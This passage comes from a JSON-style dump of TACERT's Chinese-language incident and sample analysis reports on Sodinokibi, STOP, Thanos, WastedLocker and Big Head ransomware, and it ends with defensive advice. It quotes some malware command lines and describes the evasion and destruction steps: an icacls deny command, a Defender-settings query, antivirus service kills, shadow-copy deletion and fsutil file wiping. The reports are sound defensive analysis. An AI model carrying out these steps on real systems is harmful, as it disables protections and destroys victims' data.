        "content": "相似,推測這8 次powershell 紀錄應該是執行windows firewall.exe 所造成。 將亂碼命令解碼後發現為刪除影子副本的命令。 (4)對Windows firewall.exe 進行程式碼檢測,發現在section 內容的配 置資源.gjgc2 是被列入黑名單,其中此資源的前32 個字節是用於解 碼配置的密鑰「bXF3CPXghRJNY14Qe8bjUPED32BvAA5R」,而其餘 字節是編碼配置。  22 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、事件攻擊行為示意圖 本事件雖牽涉多台主機,但由於取證資訊有限,將以鑑識電力監測系統主機 (31 主機)為主,來呈現駭客的攻擊行為。  23 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 1. 使用者在2016/4/27 下午4:12 安裝電腦備份還原軟體EaseUS Todo Backup 後,建立帳戶ETB User。 2. 駭客在2019/9/12 下午10:51 首次遠端桌面連線登入帳戶ETB User。 3. 在2019/9/12 下午10:52 執行Windows Mail 備份(產生edb00001.log)。 4. 在2019/9/12 下午10:53 安裝ScreenConnectClient(efb8cf813b6eaefc)。 A. 執行ScreenConnect.ClientService.exe B. 呼叫ScreenConnect.WindowsClient.exe 5. 在2019/9/12 下午10:58 建立使用者帳戶adm。 6. 在2019/9/12 下午11:03 再次遠端桌面連線登入帳戶ETB User。 7. 在2019/9/12 下午11:04 執行20ace.msi 來安裝ESET NOD32 Antivirus 防毒軟 體。 8. 在2019/9/12 下午11:08 執行Windows Firewall.exe 來加密主機內檔案。 A. Windows Firewall.exe 呼叫PowerShell 來刪除影子副本。 9. 2019/9/12 PM 11:11 以帳戶ETB user 網路登入12 主機。 10. 在2019/9/17 上午1:25 執行setup.m",
        "Page_Num": "22,23,24"
    },
    "359": {
        "File_Name": "個案分析-勒索病毒Sodinokibi攻擊事件分析報告_10810.pdf",
        "content": "si 來再次安裝ScreenConnectClient (efb8cf813b6eaefc)。 四、總結與建議 1. Sodinokibi(也稱為REvil)勒索軟體於2019 年4 月17 日首次被發現。它 是由有經濟動機的GOLD SOUTHFIELD 威脅組織使用的,該組織通過漏  24 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 洞利用工具包、掃描漏洞技術、RDP 伺服器和有後門軟體安裝程式來散 播勒索軟體。它可以利用CVE-2018-8453 漏洞提升特權,成功利用此漏 洞的攻擊者可以在內核模式下運行任意代碼。 然後,攻擊者可能會安裝 程式、查看、更改或刪除資料;或者建立具有系統管理者權限的新帳戶。 從本案的攻擊行為,可以明確地看到駭客充分運用勒索軟體Sodinokibi 的散播手法來進行攻擊。 2. 從本資安事件的發生,可歸納出下列幾點資安防護漏洞提供參考。 (1) 受害主機的系統版本老舊,Windows update 未開啟檢查更新設定。 (2) 受害主機的防火牆未開啟。 (3) 受害主機開啟許多容易受駭客攻擊的port,如3389 port 與445 port。 (4) 受害主機所安裝的防毒軟體無法識別Windows firewall.exe 為 Sodinokibi 勒索軟體。 (5) 在2016/4/27 建立的帳戶ETB User 可能存在硬編碼的管理密碼漏洞。 (6) 從與管理者訪談得知,廠商使用簡易的相同密碼登入各主機來進行維 護作業,降低駭客入侵的困難度,也容易遭受密碼填充攻擊。 (7) 駭客在駭入含有EaseUS Todo Backup 軟體所產生的帳戶ETB User 之 主機後,向同一區域網路內含有帳戶ETB User 的各主機進行攻擊。 (8) 本事件中各主機感染Sodinokibi 勒索軟體的方式,推測是駭客駭入各 主機後手動執行Sodinokibi 的惡意程式造成感染。 3. 針對本資安事件建議下列幾點資安防護措施,提供大家參考。 (1) 定期進行系統更新。 (2) ",
        "Page_Num": "24,25"
    },
    "360": {
        "File_Name": "個案分析-勒索病毒Sodinokibi攻擊事件分析報告_10810.pdf",
        "content": "開啟主機上的防火牆設定。 (3) 關閉主機上非必要開啟的port。 (4) 更換功能更強大的防毒軟體,並定期更新病毒碼。 (5) 定期備份主機資料。  25 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (6) 定期檢視主機狀態,如連線紀錄、使用者帳戶資訊。 (7) 強化使用者密碼設定的複雜度。 (8) 管理者在管理區域網路內各主機時,勿使用同一組帳戶與密碼來登入 各主機。 (9) 避免使用網路芳鄰進行檔案分享,建議關閉非必要使用的網路磁碟機。 (10)更新軟體EaseUS Todo Backup 之版本,來修補硬編碼的管理密碼漏 洞。 五、相關資料 1. REvil/Sodinokibi Ransomware https://www.secureworks.com/research/revil-sodinokibi-ransomware ",
        "Page_Num": "25,26"
    },
    "361": {
        "File_Name": "個案分析-勒索病毒Stop分析報告.pdf",
        "content": "TLP:WHITE 勒索病毒Stop 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2021 年07 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 2021/6 中旬某學校一台主機感染勒索病毒,因有掛載NAS 資料夾為網 路磁碟機,導致NAS 共用資料夾內檔案被加密。 2. 從被加密檔案的修改時間發現檔案被加密時間點在2021/6/18 下午 12:21,而且被加密檔案之副檔名皆為sspq。 3. 經TACERT 檢測判定該校主機感染勒索病毒的種類為STOP 勒索軟體 家族2021 年新變種sspq 病毒。 4. STOP 的變種病毒Sspq 是一種由提供下載種子、破解遊戲、免費軟體、 密鑰生成器、激活器等的網站散播的惡意軟體。 5. 根據EMSISOFT 公司的2021 年第一季最常被通報的勒索軟體之數據統 計,可看到STOP/Djvu 的勒索軟體家族位居第一,是迄今為止最常見的 病毒,佔所有通報數據的51.4%。 圖1 2021 年第一季最常被通報的10 種勒索軟體(包含STOP 勒索軟體) 資料來源:EMSISOFT 公司  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 二、事件檢測 1. 首先,在64 位元的Windows 10 作業系統上,執行STOP 樣本700bf.exe (MD5: 5986e0b21fb07b57e8841601154e5110),而700bf.exe 在主機重新開 機後會被加密(副檔名會變成sspq)。 2. 在700bf.exe 執行後會在「%AppDataLocal%」建立兩個子資料夾,並產 生700bf.exe 副本。一個放副本,另一個放下載的檔案。 (註1: 「%AppDataLocal%」是指本地應用程序資料夾,在 Windows Vista, 7, 8, 8.1, 2008(64-bit), 2012(64-bit) and 10(64-bit)系統",
        "Page_Num": "1,2,3"
    },
    "362": {
        "File_Name": "個案分析-勒索病毒Stop分析報告.pdf",
        "content": "上則是指 C:\\Users\\{user name}\\AppData\\Local 。 本案的惡意軟體還具有downloader 的功能,若成功連線命令和控制伺服 器(C&C),則C&C 會回傳加密密鑰(在線密鑰Online ID)以及必須在受害 者主機上執行的其他命令和惡意軟體。此時這些東西就會放在下載檔案的 資料夾中。另外,它添加了互斥體以確保在任何時候只有一個資料夾的惡 意程式執行。在檢測時,C&C 並沒有回應受害主機,故放下載檔案的資  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 料夾是空的。) 3. 檢視背景程式碼發現: (1) 700bf.exe 會呼叫icacls.exe 來授予惡意軟體建立資料夾的訪問權限。 使用指令: icacls \"%AppDataLocal%\\{GUID}\" /deny *S-1-1-0:(OI)(CI)(DE,DC) (2) 700bf.exe 會以管理員身份執行,而不是透過自動啟動或任務啟動它的 程序。 \"{Executed Malware File Path}\\700bf.exe”--Admin IsNotAutoStart IsNotTask (註:icacls.exe 為系統檔,來自C:\\Windows\\SysWOW64\\icacls.exe。) 4. 勒索通知信_readme.txt 告訴受害者: (1) 只有購買解密器與唯一金鑰才能解開被加密的檔案,可以免費解密 1 個檔案。 (2) 購買私鑰與解密軟體需要980 美元,如果在72 小時內聯絡他們只 要半價490 元。 (3) 駭客隨信提供查看解密器的影片網址、E-mail 聯絡信箱與Personal ID 等資訊。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 在700bf.exe 執行後發現會連線烏克蘭IP:77.123.139.190:443(疑似 C&C)。從所側錄的封包可看到該主機REQUEST 內容有網址api.2ip.ua, 但烏克蘭",
        "Page_Num": "3,4,5"
    },
    "363": {
        "File_Name": "個案分析-勒索病毒Stop分析報告.pdf",
        "content": "IP 卻沒有回傳任何內容。該網址經Virustotal 檢測判定其惡意比 例為2/88,有兩家資安公司認為其為惡意網址。 6. 在C:\\發現除了新增_readme.txt 外,還產生SystemID 資料夾,內存放 PersonalID.txt。所有被加密的檔案其副檔名皆為sspq,而被病毒訪問過的 每個資料夾都會產生一個_readme.txt。除了C:\\Windows 與C:\\Program Files 內的檔案外,其餘檔案都會被加密。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (註2:由於 Sspq 檔案解密工具只對使用離線密鑰加密的檔案進行解密, 因此每個勒索軟體受害者都需要找出用於加密檔案的密鑰。「個人 ID (PersonID)」不是密鑰,它是與用於加密檔案的密鑰相關的識別碼。 如果 ID 以「t1」結尾,則檔案使用離線密鑰加密。 如果 ID 不以「t1」結尾, 則 Sspq 勒索軟體使用了在線密鑰。)  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 檢視主機重新開機後會自動啟動的程式,發現在登錄檔 「HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\R un」內被新增「SysHelper」。它會在主機每次開機後自動執行 「%AppDataLocal%\\{GUID}」內存放的700bf.exe 副本。 8. 700bf.exe 經Virustotal 檢測其惡意比例為52/69。 9. 被加密檔案與_readme.txt 經 ID Ransomware 勒索軟體識別網站檢測為 STOP 勒索軟體,而且可能解密。 10.使用EMSISOFT 公司的STOP 解密器進行解密,結果因為病毒為新變 種無法解密,又因為ID 為offline ID,可能在未來可以解密。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (註3: 1.本案的勒索病毒會收集有關受害者主機的信息,",
        "Page_Num": "5,6,7,8"
    },
    "364": {
        "File_Name": "個案分析-勒索病毒Stop分析報告.pdf",
        "content": "然後嘗試與其命 令和控制伺服器 (C&C) 建立連線。如果連線已建立,則它會將有關受感 染主機的信息發送到伺服器,而伺服器則會回傳加密密鑰(即所謂的「在 線密鑰」Online ID)以及必須在受害者主機上執行的其他命令和惡意軟 體。如果病毒無法與其命令和控制伺服器(C&C)建立連線,則它使用固定 密鑰(即所謂的「離線密鑰」Offline ID)。本案由EMSISOFT 解密器的解 密結果可得知使用固定密鑰(Offline ID)。) 2. 若Sspq 檔案使用解密工具解密檔案後出現「No key for New Variant online ID」,這意味著您的檔案是使用「在線密鑰」加密的,因此無法解 密,因為只有 sspq 作者擁有解密所需的密鑰。)  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、攻擊行為示意圖 1.受害者至惡意網站下載檔案感染STOP 病毒700bf.exe 2.執行700bf.exe 開始加密檔案。 3.在「%AppDataLocal%」建立兩個子資料夾並產生700bf.exe 副本。 4.呼叫icacls.exe 來授予惡意軟體建立資料夾的訪問權限。 5.以管理員身份執行700bf.exe。 6.新增SysHelper 的開機自動執行700bf.exe 副本之設定於登錄檔中。 7.建立C:\\SystemID 資料夾並放入PersonalID.txt。 8.連線IP:77.123.139.190:443。(沒有取得烏克蘭IP 的回應 Offline ID) 9.產生_readme.txt。 10.在主機重新開機後700bf.exe 被加密,變成700bf.exe.sspq。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 四、 總結與建議 1. STOP 勒索病毒可透過存有密鑰產生器與破解程序等工具的網站,讓瀏覽 者想免費激活付費軟體時下載這些工具,進而感染STOP 病毒。 2. 當主機感染STOP 病毒時,若有連線NAS ",
        "Page_Num": "8,9,10"
    },
    "365": {
        "File_Name": "個案分析-勒索病毒Stop分析報告.pdf",
        "content": "設備的資料夾、USB 或外接硬 碟,則這些連線設備內的檔案將被加密。 3. STOP 病毒的副本會在每次主機開機時自動執行,若主機有存取新檔案, 則新檔案將會被加密。在處理主機時,需先將STOP 病毒的副本優先移除 才行。 4. STOP 病毒會連線C&C 伺服器,若連線成功,則取得加密金鑰(OnlineID)、 要執行的其他命令和惡意軟體。若連線無回應,則加密使用固定金鑰 (OfflineID)。(Online ID 無法解密,而Offline ID 等待未來解密。) 5. 對於預防STOP 勒索病毒方面,除了平時定期備份資料外,因STOP 病毒 的散播方式來自惡意網站下載檔案造成,建議若有下載軟體需求時,需確 認下載來源的安全性。 6. 校園中發生NAS 感染勒索病毒的事件頻繁。許多學校人員因為方便性, 習慣將NAS 資料夾掛載於主機上使用,又有些學校會開放NAS 讓校外IP 存取,這些行為將使NAS 存在資安風險。在NAS 的管理上,建議限制存 取NAS 的IP(Ex:僅限校內IP 存取),以及定期備份NAS 內資料。 五、 相關參考資料 1. Ransomware statistics for 2021: Q1 report https://blog.emsisoft.com/en/38619/ransomware-statistics-for-2021-q1-rep ort/ ",
        "Page_Num": "10"
    },
    "366": {
        "File_Name": "個案分析-勒索病毒Thanos分析報告.pdf",
        "content": "TLP:WHITE 勒索病毒Thanos 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2021 年03 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 在2021/2 初某學校在凌晨2:00~5:00 期間遭受勒索軟體的攻擊,造成5 台行 政用主機內檔案被加密。 2. 這些受害主機有掛載網路磁碟機的資料夾,但資料夾內檔案沒有被加密。 3. 在受害主機上無任何防毒軟體,疑似被卸載或未安裝防毒軟體。 4. 經檢測發現這些受害主機的勒索病毒特徵都相同。被加密的檔案之副檔名皆 為containers,而且都有兩種檔案類型的勒索通知信(txt 檔與hta 檔)。 5. 這些主機內的勒索通知信與被加密的檔案經ID Ransomware 勒索軟體識別網 站(https://id-ransomware.malwarehunterteam.com)檢測,每台主機判定的結果皆 為Thanos,而且該勒索軟體目前尚未有解密器。 6. 為了瞭解勒索軟體Thanos 的攻擊行為,本中心取得該類型勒索軟體的樣本後 進行檢測。 二、事件檢測 1. 首先,使用一台有掛載網路磁碟機之資料夾的Windows 7 主機,接著將樣本 6a50.exe 置於主機上執行。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. 執行6a50.exe 後主機會立即重新開機。在開機完後主機進入安全模式,而且 無法連接網路磁碟機。 在登入安全模式後不久,桌面會出現勒索通知信 HOW_TO_DECYPHER_FILES.hta 的視窗畫面與Information 提醒視窗,並且 在桌面上也產生兩個不同檔案類型的勒索通知信檔案(txt 檔與hta 檔)。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 查看HOW_TO_DECYPHER_FILES.txt 的內容,發現駭客僅簡短地告訴受害 ",
        "Page_Num": "1,2,3,4"
    },
    "367": {
        "File_Name": "個案分析-勒索病毒Thanos分析報告.pdf",
        "content": "者你的檔案已被安全地加密,並且提供了駭客的聯絡信箱。最後,文字檔內 有識別這個受害主機的Key Identifier。 4. 檢視HOW_TO_DECYPHER_FILES.hta 的內容,發現在主機進入安全模式後 桌布大小變小。因此受害者一開始僅會看到一個鬼臉(如下圖)與「Your Files are Encrypted」,接著往下查看.hta 檔內容才會看到勒索通知信內文。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 在hta 檔的勒索通知信內文中,駭客告訴受害者不要擔心,只要在48 小時內 付款就可以還原檔案,否則檔案將遺失。駭客也提供比特幣錢包的ID 資訊與 聯絡信箱給受害者,並且告訴受害者還原這些被加密的檔案需要兩萬美金。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 檢視主機內檔案被加密的情形,發現除了C:\\windows 與C:\\program files 內的 檔案沒被加密外,大部分的檔案都被加密了。被加密的檔案其副檔名 為.crypted,而且在每個被加密檔案的資料夾內都有一個勒索通知信檔案 HOW_TO_DECYPHER_FILES.txt。在這些被加密的檔案中,發現.wmv 的影 片檔案沒有被加密,推測該勒索軟體應該對於加密哪些類型的檔案有設定範 圍。 6. 檢視主機的開機後程序,發現有兩個檔案6a50.exe 與mystartup.lnk 遺失。查 看6a50.exe 原來所在資料夾,發現在執行後該檔案已消失,推測該勒索軟體 Thanos 具有自我刪除本身的功能。 7. 當主機再次重新開機後,會出現一個Information 的訊息。在按下確定按鈕後 才出現登入畫面,登入後主機已不是安全模式。Information 訊息內容與 HOW_TO_DECYPHER_FILES.hta 的內容大同小異。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 執行6a50.exe 後",
        "Page_Num": "4,5,6,7"
    },
    "368": {
        "File_Name": "個案分析-勒索病毒Thanos分析報告.pdf",
        "content": "會先呼叫powershell.exe,接著會執行net.exe(net1.exe)、 sc.exe、vssadmin.exe 、taskkill.exe、cmd.exe Mshta.exe、 bcdedit.exe、 cmd.exe(PING.EXE、fsutil.exe)與cmd.exe(Choice.exe)等程序。 (1) 呼叫powershell.exe 來執行「“powershell” Get-MpPreference –verbose」,以 取得Windows Defender 當前的設置內容,來繞過Windows defender 的檢 測。 (2) 陸續執行net.exe 來呼叫net1.exe 共36 次,以停止36 種防毒軟體的服務 程序。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (3) 為防止惡意軟體Thanos 被終止,該惡意軟體還執行以下服務控制和  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team taskkill 命令。利用執行sc.exe 來修改註冊表與服務控制管理器資料庫中 服務條的目的值,以關閉4 個非關鍵服務,其中3 個為與SQL 有關的服 務。 (4) 執行taskkill.exe 來中止3 個執行中的程序(mspub.exe、mydesktopqos.exe 與mydesktopservice.exe)。 (5) 該惡意軟體還執行vssadmin.exe 來刪除所有影子副本與調整陰影複製儲 存區關聯的大小上限。 (6) 執行cmd.exe(2572)來清空資源回收桶內所有檔案,執行mshta.exe 來顯示 勒索通信的.hta 檔內容,透過bcdedit.exe 來下達在開機時取消進入安全模 式的指令。 (7) 執行cmd.exe(3688)呼叫PING.EXE 來將ping 指令輸出重定向至無效設 備,而不是控制台。之後cmd.exe(3688)會呼叫fsutil.exe 來使用空資料覆 蓋檔案中的資料,從檔案的第0 個字節開始覆蓋,覆蓋長度為524288 個  9 臺灣學術網路危機處理中心",
        "Page_Num": "7,8,9,10"
    },
    "369": {
        "File_Name": "個案分析-勒索病毒Thanos分析報告.pdf",
        "content": "(TACERT) TANet Computer Emergency Response Team 字節。最後在不會跳出提示訊息的安靜模式下強制刪除檔案。 (8) 執行cmd.exe(3708)呼叫choice.exe 來在指定時間內進行只有一個Y 選項 的選擇,最後會刪除惡意軟體6a50.exe。 9. 6a50.exe 經Virustotal 檢測其惡意比例很高,為60/71。少數防毒軟體公司以 Thanos 命名它。大多數防毒軟體可偵測出樣本6a50.exe 所在。 Thanos ransomware builder 具有43 種配置項目,可以依配置項目產生不同特 徵的Thanos 變種樣本,其中具有繞過防毒軟體偵測的配置選項。 因此,防 毒軟體有時是無法偵測到它的存在。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team Thanos ransomware builder 示意圖 (Source: Recorded Future,https://www.recordedfuture.com/thanos-ransomware-builder) 三、攻擊行為示意圖 當駭客散播惡意軟體6a50.exe 導致受害主機感染6a50.exe 後,在主機內會執行 6a50.exe,接著該惡意軟體會進行下面的攻擊行為。 1. 主機會重新開機,並且在開機後進入安全模式。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. 執行powershell.exe 來取得Windows Defender 的資訊並繞過檢測。 3. 執行net.exe 來停止36 種防毒軟體的服務程序。 4. 執行sc.exe 來關閉4 個非關鍵服務,其中3 個為與SQL 有關的服務。 5. 執行taskkill.exe 來中止3 個執行中的程序(mspub.exe、mydesktopqos.exe 與 mydesktopservice.exe)。 6. 執行vssadmin.exe 來刪除所有影子副本與調整陰影複製儲存區關聯的大小上 限。 7. 執行cmd.exe(2572)來清空資源回收桶內所有檔案。 8. 執行6a50.exe ",
        "Page_Num": "10,11,12"
    },
    "370": {
        "File_Name": "個案分析-勒索病毒Thanos分析報告.pdf",
        "content": "來加密主機內檔案。 9. 在加密作業完成後,執行mshta.exe。接著在主機桌面會顯示勒索通知信.hta 檔的視窗訊息。 10. 執行bcdedit.exe 在開機時取消安全模式。 11. 執行cmd.exe(3688): 11.1 將ping 指令輸出重定向至無效設備。 11.2 執行fsutil.exe 來用空資料覆蓋檔案中的資料。 11.3 在不會跳出提示訊息下強制刪除檔案。 12. 執行cmd.exe(3708)後呼叫choice.exe 來在指令時間內進行只有一個Y 選項的 選擇。 13. 刪除惡意軟體6a50.exe。 四、 總結與建議 1. 採用RaaS(勒索軟體即服務)模式的勒索軟體Thanos 最早在2020 年1 月被 發現,並在各種論壇被宣傳與出售,而在2020 年7 月初Thanos 對中東與 北非的兩個國有組織進行攻擊。 2. 因Thanos 的builder 具有43 種配置選項,可依照購買者需求自行定義  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team Thanos 變種樣本,其中包含RIPlace 技術、繞過防毒軟體偵測、反分析、 反VM 等都是配置選項之一。 3. Thanos 執行後會以安全模式重新啟動受感染的作業系統,從而繞過防毒 軟體的檢測。它也會中止36 種防毒軟體的服務與刪除影子副本。在執行 最後Thanos 會刪除自己本身。 4. 由於builder 的多功能導致Thanos 樣本多樣化,容易使防毒軟體未能即時 檢測出它,故預防Thanos 的最佳方法為定期備份資料,不隨意開啟不明 來源的檔案或信件。 ",
        "Page_Num": "12,13"
    },
    "371": {
        "File_Name": "個案分析-勒索病毒WastedLocker分析報告_10908.pdf",
        "content": "勒索病毒WastedLocker 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2020 年08 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 2020/5 初WastedLocker 首次被揭露,該勒索軟體來自於惡名昭彰的俄羅斯駭 客集團「Evil Group」。 2. 2020/6 賽門鐵克發現攻擊者試圖在其網路上部署WastedLocker,並且對美國 公司進行攻擊。 其最終目標是透過加密受害者的大部分電腦和伺服器來削弱 受害者的IT 基礎架構,以要求獲得數百萬美元的贖金。 3. 賽門鐵克發現了針對31 個組織的攻擊,所有組織都位於美國。除了一些大型 私人公司外,還有11 家上市公司,其中有8 家是《財富》 500 強公司。 4. WastedLocker 最近最受矚目的受害者之一是可穿戴技術和智能手錶製造商 Garmin。 5. 由賽門鐵克的統計資料得知「製造業」是受影響最嚴重的公司組織,緊隨其 後的是「信息技術」和「媒體與電信」類的公司組織。 圖1: WastedLocker 所目標式攻擊的各行業組織數量(資料來源:賽門鐵克) 6. 為了瞭解勒索WastedLocker 的攻擊行為與對主機的危害程度,本中心取得樣 本後進行分析。 二、事件檢測  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 1. 首先,將惡意程式樣本905ea119.exe 於Windows 10 (32 位元)的作業系統上執 行,執行後該樣本程式會於原資料夾內消失。 2. 檢視主機的背景程式運作情形,發現905ea119.exe 執行後呼叫一些系統程式 來執行一些指令。 3. 905ea119.exe 執行後會在%system32%內產生Classes.exe,之後如下列程序: (1) 在%AppData%建立Classes:bin。 (2) 在%AppData%建立F79}:bin。 (3) 刪除影子副本。 (4) 重新指派Classes.exe 的擁有權。 (5) 重",
        "Page_Num": "1,2,3"
    },
    "372": {
        "File_Name": "個案分析-勒索病毒WastedLocker分析報告_10908.pdf",
        "content": "置Classes.exe 的存取控制權限。 (6) 若10 秒內沒選擇,則自動執行預設值。 (7) 更改F79 的屬性由隱藏改為顯示。 (8) 刪除F79。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (9) 若在10 秒沒有選擇則自動執行預設值。 (10) 變更Classes 的屬性由隱藏改為顯示。 (11) 刪除Classes。 (12) 變更905ea119.exe 的屬性由隱藏改為顯示。 (13) 刪除905ea119.exe。 (14) 複製影子副本。 (15) 變更Classes.exe 的屬性由隱藏改為顯示。 (16) 刪除Classes.exe。 4. 主機內被加密的檔案皆會延伸副檔名為garminwasted,並且產生一個以原被 加密檔案檔名延伸出副檔名為garminwasted_info 之檔案。Garmin 為受害企業 之一,故該病毒會以受駭的目標企業名稱縮寫並加上字串「wasted」作為加 密檔案的副檔名。除了C:\\Windows 與C:\\Program Files 資料夾沒被加密外, 其餘資料夾的檔案都被加密,但該惡意程式不會對.txt 文字檔加密。 5. 檢視被加密後產生副檔名.garminwasted_info 的檔案,發現為勒索通知信。該 檔案告訴受害者兩個取得贖金資訊的聯絡信箱與檔案被加密的Key 資訊。每 個被加密的檔案都會產生一個勒索通知信。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 將副檔名.garminwasted_info 的檔案與一個被加密的檔案上傳ID Ransomware 勒索病毒識別網站,經檢測判定為WastedLocker。該勒索病毒目前尚未有解 密器,建議備份被加密的檔案,以待未來解密器的產生。 7. 905ea119.exe 經Virustotal 檢測其惡意比例為61/72。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. classes.exe 經",
        "Page_Num": "3,4,5,6"
    },
    "373": {
        "File_Name": "個案分析-勒索病毒WastedLocker分析報告_10908.pdf",
        "content": "Virustotal 檢測其惡意比例為61/72,而且其HASH 值與 905ea119.exe 相同,可見為相同的程式。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、攻擊行為示意圖 1. 受害者下載含有惡意的JavaScript 的ZIP 壓縮檔感染到惡意程式 905ea119.exe。 2. 之後執行惡意程式905ea119.exe。 3. 惡意程式905ea119.exe 執行後會在%system32%內產生Classes.exe。 4. 在%AppData%建立Classes.bin。 5. 在%AppData%建立F79}:bin。 6. 執行vssvc.exe 來複製影子副本。 7. 執行vssadim.exe 來刪除影子副本。 8. 重新指派Classes.exe 的擁有權。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 9. 重置Classes.exe 的存取控制權。 10. 執行Classes.exe 來開始加密檔案。 11. 執行cmd.exe。 (1) 執行choice.exe 若10 秒內沒選擇則自動執行預設值。 (2) 執行attrib.exe 變更905ea119.exe 的屬性由隱藏改為顯示。 (3) 刪除905ea119.exe。 12. 執行cmd.exe。 (1)執行choice.exe 若10 秒內沒選擇則自動執行預設值。 (2)執行attrib.exe 更改F79 的屬性由隱藏改為顯示。 (3)刪除F79。 13. 執行cmd.exe。 (1) 執行choice.exe 若10 秒內沒選擇則自動執行預設值。 (2) 執行attrib.exe 變更Classes 的屬性由隱藏改為顯示。 (3) 刪除Classes。 14. 執行cmd.exe。 (1) 執行choice.exe 若10 秒內沒選擇則自動執行預設值。 (2) 執行attrib.exe 變更Classes.exe 的屬性由隱藏改為顯示。 (3) 刪除Classes.exe。 四、總結與建議 1. 勒索軟體WastedLocker ",
        "Page_Num": "6,7,8"
    },
    "374": {
        "File_Name": "個案分析-勒索病毒WastedLocker分析報告_10908.pdf",
        "content": "以目標式組織為攻擊對象,執行後會在原處自我 消失。 2. 它所產生的勒索通知信內容一開始會有被攻擊的目標組織名稱。 3. 該病毒會以被攻擊的目標組織名稱當被加密檔案的副檔名開頭文字,之後 加入wasted 的用字作為副檔名。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 該病毒會產生一個分身classes.exe 於%system32%內來執行檔案加密作 業。 5. 目前該病毒尚未有解密器,可將被加密的檔案先保存起來,若未來有解密 器產生則可能有機會恢復檔案內容。 6. 由於該病毒透過瀏覽器下載含有惡意JavaScript 的ZIP 壓縮檔來散播,之 後該病毒會被下載執行,建議不要隨意下載或開啟不明來源的檔案。 ",
        "Page_Num": "8,9"
    },
    "375": {
        "File_Name": "個案分析-勒索軟體BigHead分析報告.pdf",
        "content": "TLP:WHITE 勒索軟體Big Head 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2023 年08 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、事件簡介 1. 2023/5 出現勒索軟體Big Head,它藉著Windows 更新程式或Word 安裝檔案 的方式來利用惡意廣告散布。 為了解該勒索軟體之攻擊行為,故進行該樣本 檢測作業。 二、 事件檢測 1. 在64 位元的Windows 7 作業系統上,執行Big Head 樣本6d27c1b457.exe。 在執行後,主機出現Windows Update 的畫面。該畫面會執行很久,X% complete 會跑很慢,最終只能使用 Windows 工作管理員關閉該執行程序 Form1。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. 在6d27c1b457.exe 執行後,會每間隔一秒重複呼叫1.exe 來執行,產生很多 呼叫程序。除了關機外,無法利用Windows 工作管理員來中斷執行中的1.exe。 3. 在6d27c1b457.exe 執行後,會呼叫 1.exe、archive.exe 與xarch.exe 來執行。 1.exe 是一款勒索軟體,會產生自身的副本以進行散播。archive.exe 會產出一 個名為 teleratserver.exe 的檔案來執行。teleratserver.exe 是一個 Telegram 機 器人,負責與威脅參與者的聊天機器人 ID 建立通訊。xarch.exe 會產出一個 名為 BXIuSsB.exe 的檔案來執行。BXIuSsB.exe 是一款加密檔案並將檔案名 稱編碼為Base64 的勒索軟體。它還會顯示虛假的Windows 更新畫面,以欺 騙受害者,讓他們認為惡意活動是合法程序。 4. Big Head 樣本6d27c1b457.exe 執行後會產出下表所列相關惡意程式,大致可 分為三種程式: 勒索軟體(BigHead)、下載器(Downloader/ Dropper)與Telebot。",
        "Page_Num": "1,2,3"
    },
    "376": {
        "File_Name": "個案分析-勒索軟體BigHead分析報告.pdf",
